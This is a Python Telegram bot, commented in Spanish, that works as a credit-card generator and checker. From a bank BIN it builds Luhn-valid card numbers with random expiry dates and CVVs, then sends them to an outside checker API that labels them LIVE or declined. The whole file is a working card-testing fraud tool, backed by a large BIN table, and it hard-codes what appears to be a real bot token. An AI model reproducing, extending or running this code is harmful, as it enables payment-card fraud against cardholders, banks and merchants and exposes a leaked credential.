import os
import random
import logging
import requests
import re
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters, CommandHandler

# Configuración de Logging para Render
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

async def error_handler(update, context):
    logging.error("Exception while handling an update:", exc_info=context.error)
# --- TU BASE DE DATOS DE BINS (Simplificada para el ejemplo) ---
BINS_DB = [
    ("37xxxxxxxxxxxxx",  "AmEx"),
    ("3782xxxxxxxxxx",   "AmEx Small Corporate Card"),
    ("3787xxxxxxxxxx",   "AmEx Small Corporate Card"),
    ("37x8xxxxxxxxxx",   "AmEx Gold"),
    ("37x37xxxxxxxxx",   "AmEx Platinum"),
    ("37xxxxxxxxx11xx",  "AmEx issued since 1995"),
    ("30xxxxxxxxxxxxxx", "Diners Club"),
    ("31xxxxxxxxxxxxxx", "Diners Club"),
    ("35xxxxxxxxxxxxxx", "Diners Club"),
    ("36xxxxxxxxxxxxxx", "Diners Club"),
    ("38xxxxxxxxxxxxxx", "Carte Blanche"),
    ("35xxxxxxxxxxxxxxx","JCB (Japanese Credit Bureau)"),
    ("400314xxxxxxxxxx", "Visa Debit-Banca Monte Dei Paschi Di Siena (Italy)"),
    ("400315xxxxxxxxxx", "Visa-Banca Monte Dei Paschi Di Siena (Italy)"),
    ("4024023xxxxxxxxx","Visa Gold-Bank of America"),
    ("4019xxxxxxxxxxxx", "Visa CV/Gold-Bank of America"),
    ("4024xxxxxxxxxxxx", "Visa PV-Bank of America"),
    ("4040xxxxxxxxxxxx", "Visa CV-Wells Fargo"),
    ("4048xxxxxxxxxxxx", "Visa CV"),
    ("402400710xxxxxxx","Visa-Wells Fargo"),
    ("4013xxxxxxxxxxxx", "Visa-Citibank"),
    ("4013xxxxxxxxxxxx", "Visa-Bank of America"),
    ("402360xxxxxxxxxx", "Visa Electron Prepaid-Postale Italiane (Italy)"),
    ("4027xxxxxxxxxxxx", "Visa-Rockwell Federal Credit Union"),
    ("4032xxxxxxxxxxxx", "Visa-Household Bank"),
    ("4052xxxxxxxxxxxx", "Visa-First Cincinnati"),
    ("4060xxxxxxxxxxxx", "Visa-Associates National Bank"),
    ("4070xxxxxxxxxxxx", "Visa-Security Pacific"),
    ("4071xxxxxxxxxxxx", "Visa-Colonial National Bank"),
    ("4094xxxxxxxxxxxx", "Visa-A.M.C. Federal Credit Union"),
    ("4113xxxxxxxxxxxx", "Visa-Valley National Bank"),
    ("4114xxxxxxxxxxxx", "Visa-Chemical Bank"),
    ("4121xxxxxxxxxxxx", "Visa-Pennsylvania State Employees Credit Union"),
    ("4121xxxxxxxxxxxx", "Visa CV-Signet Bank"),
    ("4122xxxxxxxxxxxx", "Visa-Union Trust"),
    ("4125xxxxxxxxxxxx", "Visa-Marine Midland"),
    ("4128xxxxxxxxx",    "Visa CV-Citibank"),
    ("4128xxxxxxxxxxxx", "Visa-Citibank/Citicorp"),
    ("4131xxxxxxxxxxxx", "Visa-State Street Bank"),
    ("4225xxxxxxxxxxxx", "Visa-Chase Manhattan Bank"),
    ("4226xxxxxxxxxxxx", "Visa-Chase Manhattan Bank"),
    ("4231xxxxxxxxxxxx", "Visa-Chase Lincoln First Classic"),
    ("4232xxxxxxxxxxxx", "Visa-Chase Lincoln First Classic"),
    ("4239xxxxxxxxxxxx", "Visa-Corestates"),
    ("4241xxxxxxxxxxxx", "Visa-National Westminster Bank"),
    ("4250xxxxxxxxxxxx", "Visa-First Chicago Bank"),
    ("4253xxxxxxxxxxxx", "Visa-Consumers Edge"),
    ("425451230xxxxxxx","Visa Premier card-Security First"),
    ("4254xxxxxxxxxxxx", "Visa-Security First"),
    ("4271382xxxxxxxxx","Visa PV-Citibank"),
    ("4271xxxxxxxxxxxx", "Visa-Citibank/Citicorp"),
    ("4301xxxxxxxxxxxx", "Visa-Monogram Bank"),
    ("4302xxxxxxxxxxxx", "Visa-H.H.B.C."),
    ("4311xxxxxxxxxxxx", "Visa-First National Bank of Louisville"),
    ("4317xxxxxxxxxxxx", "Visa-Gold Dome"),
    ("4327xxxxxxxxxxxx", "Visa-First Atlanta"),
    ("4332xxxxxxxxxxxx", "Visa-First American Bank"),
    ("4339xxxxxxxxxxxx", "Visa-Primerica Bank"),
    ("4342xxxxxxxxxxxx", "Visa-N.C.M.B. / Nations Bank"),
    ("4356xxxxxxxxxxxx", "Visa-National Bank of Delaware"),
    ("4368xxxxxxxxxxxx", "Visa-National West"),
    ("4387xxxxxxxxxxxx", "Visa-Bank One"),
    ("4388xxxxxxxxxxxx", "Visa-First Signature Bank & Trust"),
    ("4401xxxxxxxxxxxx", "Visa-Gary-Wheaton Bank"),
    ("4413xxxxxxxxxxxx", "Visa-Firstier Bank Lincoln"),
    ("4418xxxxxxxxxxxx", "Visa-Bank of Omaha"),
    ("4421xxxxxxxxxxxx", "Visa-Indiana National Bank"),
    ("4424xxxxxxxxxxxx", "Visa-Security Pacific National Bank"),
    ("4428xxxxxxxxxxxx", "Visa-Bank of Hoven"),
    ("4436xxxxxxxxxxxx", "Visa-Security Bank & Trust"),
    ("4443xxxxxxxxxxxx", "Visa-Merrill Lynch Bank & Trust"),
    ("4447xxxxxxxxxxxx", "Visa-AmeriTrust"),
    ("444802xxxxxxxxx", "Visa Premier card"),
    ("4452xxxxxxxxxxxx", "Visa-Empire Affiliates Federal Credit Union"),
    ("4498xxxxxxxxxxxx", "Visa-Republic Savings"),
    ("4502xxxxxxxxxxxx", "Visa-C.I.B.C."),
    ("4503xxxxxxxxxxxx", "Visa-Canadian Imperial Bank"),
    ("4506xxxxxxxxxxxx", "Visa-Belgium A.S.L.K."),
    ("4510xxxxxxxxxxxx", "Visa-Royal Bank of Canada"),
    ("4520xxxxxxxxxxxx", "Visa-Toronto Dominion of Canada"),
    ("4537xxxxxxxxxxxx", "Visa-Bank of Nova Scotia"),
    ("4538xxxxxxxxxxxx", "Visa-Barclays (UK)"),
    ("4539xxxxxxxxxxxx", "Visa-Barclays (UK)"),
    ("4543xxxxxxxxxxxx", "Visa-First Direct"),
    ("4544xxxxxxxxxxxx", "Visa-T.S.B. Bank"),
    ("4556xxxxxxxxxxxx", "Visa-T.S.B. Bank"),
    ("4564xxxxxxxxxxxx", "Visa-Bank of Queensland"),
    ("4673xxxxxxxxxxxx", "Visa-First Card"),
    ("4678xxxxxxxxxxxx", "Visa-Home Federal"),
    ("4707xxxxxxxxxxxx", "Visa-Tompkins County Trust"),
    ("471212500xxxxxxx","Visa-IBM Credit Union"),
    ("4719xxxxxxxxxxxx", "Visa-Rocky Mountain"),
    ("4721xxxxxxxxxxxx", "Visa-First Security"),
    ("4722xxxxxxxxxxxx", "Visa-West Bank"),
    ("4726xxxxxxxxxxxx", "Visa-West Bank"),
    ("4783xxxxxxxxxxxx", "Visa-AT&T's Universal Card"),
    ("4784xxxxxxxxxxxx", "Visa-AT&T's Universal Card"),
    ("4800xxxxxxxxxxxx", "Visa-M.B.N.A. North America"),
    ("4811xxxxxxxxxxxx", "Visa-Bank of Hawaii"),
    ("4819xxxxxxxxxxxx", "Visa-Macom Federal Credit Union"),
    ("4820xxxxxxxxxxxx", "Visa-IBM Mid America Federal Credit Union"),
    ("4833xxxxxxxxxxxx", "Visa-U.S. Bank"),
    ("4842xxxxxxxxxxxx", "Visa-Security Pacific Washington"),
    ("4897xxxxxxxxxxxx", "Visa-Village Bank of Chicago"),
    ("4921xxxxxxxxxxxx", "Visa-Hong Kong National Bank"),
    ("4929xxxxxxxxxxxx", "Visa CV-Barclays Card (UK)"),
    ("453997100xxxxxxx","Visa-Banco di Napoli (Italy)"),
    ("4557xxxxxxxxxxxx", "Visa-BNL (Italy)"),
    ("4908xxxxxxxxxxxx", "Visa-Carta Moneta-CARIPLO/Intesa (Italy)"),
    ("4xxx9x604015xxxx","Visa-Carta Sì-Unipol Banca (Italy)"),
    ("4xxx9x144046xxxx","Visa-Carta Sì-Banco di Sardegna (Italy)"),
    ("4xxx9xxx40xxxxxx","Visa-Carta Sì (Italy)"),
    ("4532xxxxxxxxxxxx", "Visa-Credito Italiano (Italy)"),
    ("454759000xxxxxxx","Visa Gold-bankganadero BBV (Colombia)"),
    ("4916xxxxxxxxxxxx", "Visa-MBNA Bank"),
    ("4xxxxxxxxxxxxxx", "Visa"),
    ("4xxxxxxxxxxxxxxx","Visa"),
    ("5031xxxxxxxxxxxx", "MasterCard-Maryland of North America"),
    ("5100xxxxxxxxxxxx", "MasterCard-Southwestern States Bankard Association"),
    ("5110xxxxxxxxxxxx", "MasterCard-Universal Travel Voucher"),
    ("5120xxxxxxxxxxxx", "MasterCard-Western States Bankard Association"),
    ("5130xxxxxxxxxxxx", "MasterCard-Eurocard France"),
    ("5140xxxxxxxxxxxx", "MasterCard-Mountain States Bankard Association"),
    ("5150xxxxxxxxxxxx", "MasterCard-Credit Systems Inc."),
    ("5160xxxxxxxxxxxx", "MasterCard-Westpac Banking Corporation"),
    ("5170xxxxxxxxxxxx", "MasterCard-Midamerica Bankard Association"),
    ("5172xxxxxxxxxxxx", "MasterCard-First Bank Card Center"),
    ("518xxxxxxxxxxxxxxx","MasterCard-Computer Communications of America"),
    ("519xxxxxxxxxxxxxxx","MasterCard-Bank of Montreal"),
    ("5201xxxxxxxxxxxx", "MasterCard-Mellon Bank N.A."),
    ("5202xxxxxxxxxxxx", "MasterCard-Central Trust Company N.A."),
    ("5204xxxxxxxxxxxx", "MasterCard-Security Pacific National Bank"),
    ("5205xxxxxxxxxxxx", "MasterCard-Promocion y Operacion S.A."),
    ("5206xxxxxxxxxxxx", "MasterCard-Banco Nacional do Mexico"),
    ("5207xxxxxxxxxxxx", "MasterCard-New England Bankard Association"),
    ("5208xxxxxxxxxxxx", "MasterCard-Million Card Service Co. Ltd."),
    ("5209xxxxxxxxxxxx", "MasterCard-The Citizens & Southern National Bank"),
    ("5210xxxxxxxxxxxx", "MasterCard-Kokumai Shinpan Company Ltd."),
    ("5211xxxxxxxxxxxx", "MasterCard-Chemical Bank Delaware"),
    ("5212xxxxxxxxxxxx", "MasterCard-F.C.C. National Bank"),
    ("5213xxxxxxxxxxxx", "MasterCard-The Bankcard Association Inc."),
    ("5215xxxxxxxxxxxx", "MasterCard-Marine Midland Bank N.A."),
    ("5216xxxxxxxxxxxx", "MasterCard-Old Kent Bank & Trust Co."),
    ("5217xxxxxxxxxxxx", "MasterCard-Union Trust"),
    ("5218xxxxxxxxxxxx", "MasterCard-Citibank/Citicorp"),
    ("5219xxxxxxxxxxxx", "MasterCard-Central Finance Co. Ltd."),
    ("5220xxxxxxxxxxxx", "MasterCard-Sovran Bank/Central South"),
    ("5221xxxxxxxxxxxx", "MasterCard-Standard Bank of South Africa Ltd."),
    ("5222xxxxxxxxxxxx", "MasterCard-Security Bank & Trust Company"),
    ("5223xxxxxxxxxxxx", "MasterCard-Trustmark National Bank"),
    ("5224xxxxxxxxxxxx", "MasterCard-Midland Bank"),
    ("5225xxxxxxxxxxxx", "MasterCard-First Pennsylvania Bank N.A."),
    ("5226xxxxxxxxxxxx", "MasterCard-Eurocard Ab"),
    ("5227xxxxxxxxxxxx", "MasterCard-Rocky Mountain Bankcard System Inc."),
    ("5228xxxxxxxxxxxx", "MasterCard-First Union National Bank of North Carolina"),
    ("5229xxxxxxxxxxxx", "MasterCard-Sunwest Bank of Albuquerque N.A."),
    ("5230xxxxxxxxxxxx", "MasterCard-Harris Trust & Savings Bank"),
    ("5231xxxxxxxxxxxx", "MasterCard-Badische Beamtenbank EG"),
    ("5232xxxxxxxxxxxx", "MasterCard-Eurocard Deutschland"),
    ("5233xxxxxxxxxxxx", "MasterCard-Computer Systems Association Inc."),
    ("5234xxxxxxxxxxxx", "MasterCard-Citibank Arizona"),
    ("5235xxxxxxxxxxxx", "MasterCard-Financial Transaction System Inc."),
    ("5236xxxxxxxxxxxx", "MasterCard-First Tennessee Bank N.A."),
    ("5254xxxxxxxxxxxx", "MasterCard-Bank of America"),
    ("5273xxxxxxxxxxxx", "MasterCard(can be Gold)-Bank of America"),
    ("5286xxxxxxxxxxxx", "MasterCard-Home Federal"),
    ("5291xxxxxxxxxxxx", "MasterCard-Signet Bank"),
    ("5329xxxxxxxxxxxx", "MasterCard-Signet Bank"),
    ("533875xxxxxxxxxx", "MasterCard Prepaid-PayPal / Lottomatica (Italy)"),
    ("5410xxxxxxxxxxxx", "MasterCard-Wells Fargo"),
    ("5412xxxxxxxxxxxx", "MasterCard-Wells Fargo"),
    ("5419xxxxxxxxxxxx", "MasterCard-Bank of Hoven"),
    ("5424xxxxxxxxxxxx", "MasterCard-Bank of Hoven"),
    ("543013xxxxxxxxxx", "MasterCard-BNL/BNP Paribas (Italy)"),
    ("5434xxxxxxxxxxxx", "MasterCard-National Westminster Bank"),
    ("5465xxxxxxxxxxxx", "MasterCard-Chase Manhattan"),
    ("525501140xxxxxxx","MasterCard-Banco di Sardegna (Italy)"),
    ("530693xxxxxxxxxx", "MasterCard-Bancolombia Cadenalco (Colombia)"),
    ("540625xxxxxxxxx", "MasterCard-Banco de Occidente (Colombia)"),
    ("5426xxxxxxxxxxxx", "MasterCard-Granahorrrar (Colombia)"),
    ("5406xxxxxxxxxxxx", "MasterCard-Granahorrrar (Colombia)"),
    ("581149xxxxxxxxxx", "Maestro-BNL/BNP Paribas (Italy)"),
    ("5xxxxxxxxxxxxxxx","MasterCard/Access/Eurocard"),
    ("6013xxxxxxxxxxxx", "Discover-MBNA Bank"),
    ("60xxxxxxxxxxxxxx", "Discover"),
]

# --- VARIABLES DE ESTADO ---
user_settings = {}
user_history = {}

# --- LÓGICA DE APOYO ---

def chk_card(numero):
    numero_limpio = ''.join(c for c in str(numero) if c.isdigit())
    for patron, red in BINS_DB:
        patron_limpio = ''.join(c for c in patron if c.isdigit() or c == 'x')
        if len(numero_limpio) < len(patron_limpio): continue
        comparar = numero_limpio[:len(patron_limpio)]
        match = True
        for a, p in zip(comparar, patron_limpio):
            if p != 'x' and a != p:
                match = False
                break
        if match: return red
    return "Unknown"

def luhn_valido(numero):
    digits = [int(d) for d in str(numero)]
    suma = 0
    par = len(digits) % 2 == 0
    for i, d in enumerate(digits):
        if (i % 2 == 0 and par) or (i % 2 != 0 and not par):
            d *= 2
            if d > 9: d -= 9
        suma += d
    return suma % 10 == 0

def generar_luhn_fuerza_bruta(bin_pattern, max_intentos=1000):
    for _ in range(max_intentos):
        res = ""
        for c in bin_pattern:
            res += str(random.randint(0, 9)) if c.lower() == 'x' else c
        if luhn_valido(res): return res
    return None

def generar_cvv(red):
    if red and "amex" in red.lower(): return str(random.randint(1000, 9998))
    return str(random.randint(112, 998))

# --- PROCESADOR DE CHECKER ---

async def chk_logic(update: Update, tarjetas: list):
    if not tarjetas: return
    
    msg_status = await update.message.reply_text(f"🔍 Revisando {len(tarjetas)} tarjetas...")
    
    lives, dead, unknown = [], [], []
    url = "https://ke1.be/en/checker2/api.php"

    for cc in tarjetas:
        try:
            # Aumentamos el timeout para evitar errores de red en Render
            r = requests.post(url, data={"data": cc}, timeout=20)
            res_text = r.text
            if len(res_text) > 9:
                status_code = res_text[9]
                if status_code == '2': lives.append(f"✅ `{cc}` — {res_text[59:87]}")
                elif status_code == '1': dead.append(f"❌ `{cc}` — {res_text[60:88]}")
                elif status_code == '3': unknown.append(f"❓ `{cc}` — {res_text[63:91]}")
        except Exception as e:
            logger.error(f"Error en API para {cc}: {e}")
            unknown.append(f"⚠️ `{cc}` — Error de Conexión")

    if lives:
        await update.message.reply_text("🟢 **LIVE**\n\n" + "\n".join(lives), parse_mode='Markdown')
    if unknown:
        await update.message.reply_text("🟡 **DESCONOCIDO**\n\n" + "\n".join(unknown), parse_mode='Markdown')
    if dead:
        dead_msg = "🔴 **RECHAZADAS**\n\n" + "\n".join(dead)
        if len(dead_msg) > 4000:
            await update.message.reply_text(f"🔴 **RECHAZADAS**: {len(dead)} tarjetas.")
        else:
            await update.message.reply_text(dead_msg, parse_mode='Markdown')
    
    try:
        await msg_status.delete()
    except: pass

# --- PROCESADOR DE GENERACIÓN ---

async def ejecutar_generacion(update: Update, context: ContextTypes.DEFAULT_TYPE, raw_data: str):
    user_id = update.effective_user.id
    cantidad = user_settings.get(user_id, 10)
    
    input_split = raw_data.split('|')
    bin_pattern = input_split[0].strip()
    mes = input_split[1].strip() if len(input_split) > 1 and input_split[1].strip() != "" else "rnd"
    ano = input_split[2].strip() if len(input_split) > 2 and input_split[2].strip() != "" else "rnd"
    cvv_in = input_split[3].strip() if len(input_split) > 3 and input_split[3].strip() != "" else "rnd"

    msg_espera = await update.message.reply_text("⏳ Generando...")
    
    lista_generada = []
    for _ in range(cantidad):
        num = generar_luhn_fuerza_bruta(bin_pattern)
        if num:
            red = chk_card(num)
            m = str(random.randint(1, 12)).zfill(2) if mes == "rnd" else mes.zfill(2)
            a = str(datetime.now().year + random.randint(2, 6)) if ano == "rnd" else ano
            cvv = generar_cvv(red) if cvv_in == "rnd" else cvv_in
            lista_generada.append(f"{num}|{m}|{a}|{cvv}")

    if lista_generada:
        info_red = chk_card(bin_pattern)
        header = f"💳 **BIN:** `{bin_pattern}`\n🏦 **Red:** {info_red}\n🎲 **Cant:** {cantidad}\n\n"
        await msg_espera.edit_text(header + "\n".join([f"`{c}`" for c in lista_generada]), parse_mode='Markdown')
        await chk_logic(update, lista_generada)
    else:
        await msg_espera.edit_text("❌ No se pudo generar. Revisa el BIN.")

# --- HANDLERS ---

async def rep_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    history = user_history.get(user_id, [])
    parts = update.message.text.split()

    if not history:
        await update.message.reply_text("❌ Historial vacío.")
        return

    if len(parts) == 1:
        lista = [f"{i+1}. `{p}`" for i, p in enumerate(history)]
        await update.message.reply_text("🗂 **Historial:**\n\n" + "\n".join(lista), parse_mode='Markdown')
    else:
        try:
            idx = int(parts[1]) - 1
            if 0 <= idx < len(history):
                await ejecutar_generacion(update, context, history[idx])
            else:
                await update.message.reply_text("❌ Índice fuera de rango.")
        except:
            await update.message.reply_text("❌ Uso: `.rep [número]`")

async def chk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tarjetas = re.findall(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', update.message.text)
    if not tarjetas:
        await update.message.reply_text("❌ Formato: `.chk num|mes|año|cvv`")
        return
    await chk_logic(update, tarjetas)

async def set_cant(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        parts = update.message.text.split()
        cant = int(parts[1])
        user_settings[update.effective_user.id] = cant
        await update.message.reply_text(f"✅ Cantidad: {cant}")
    except:
        await update.message.reply_text("❌ Uso: `.cant 10`")

async def gen_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    parts = update.message.text.split(maxsplit=1)
    if len(parts) >= 2:
        await ejecutar_generacion(update, context, parts[1])

async def ggen_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    parts = update.message.text.split(maxsplit=1)
    if len(parts) >= 2:
        pattern = parts[1].strip()
        if user_id not in user_history: user_history[user_id] = []
        user_history[user_id].append(pattern)
        await update.message.reply_text(f"📥 BIN guardado.")
        await ejecutar_generacion(update, context, pattern)

async def repu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    history = user_history.get(user_id, [])
    if history:
        await ejecutar_generacion(update, context, history[-1])
    else:
        await update.message.reply_text("❌ No hay historial.")

if __name__ == '__main__':
    # Token
    TOKEN = "8613878245:AAE8TDDKY5H1qCg6l5PsaP62ySvGROrZMGM"
    
    # Construcción de la app con tiempos de espera más largos para evitar el error de red
    app = ApplicationBuilder().token(TOKEN).read_timeout(30).write_timeout(30).connect_timeout(30).build()
    
    # Priorizar comandos específicos
    app.add_handler(MessageHandler(filters.Regex(r'^[./]repu'), repu_handler))
    app.add_handler(MessageHandler(filters.Regex(r'^[./]rep'), rep_handler))
    app.add_handler(MessageHandler(filters.Regex(r'^[./]chk'), chk_handler))
    app.add_handler(MessageHandler(filters.Regex(r'^[./]cant'), set_cant))
    app.add_handler(MessageHandler(filters.Regex(r'^[./]gen'), gen_handler))
    app.add_handler(MessageHandler(filters.Regex(r'^[./]ggen'), ggen_handler))
    app.add_handler(CommandHandler("start", lambda u, c: u.message.reply_text("Bot Iniciado")))
    app.add_error_handler(error_handler)
    print("Bot activo...")
    app.run_polling(drop_pending_updates=True)
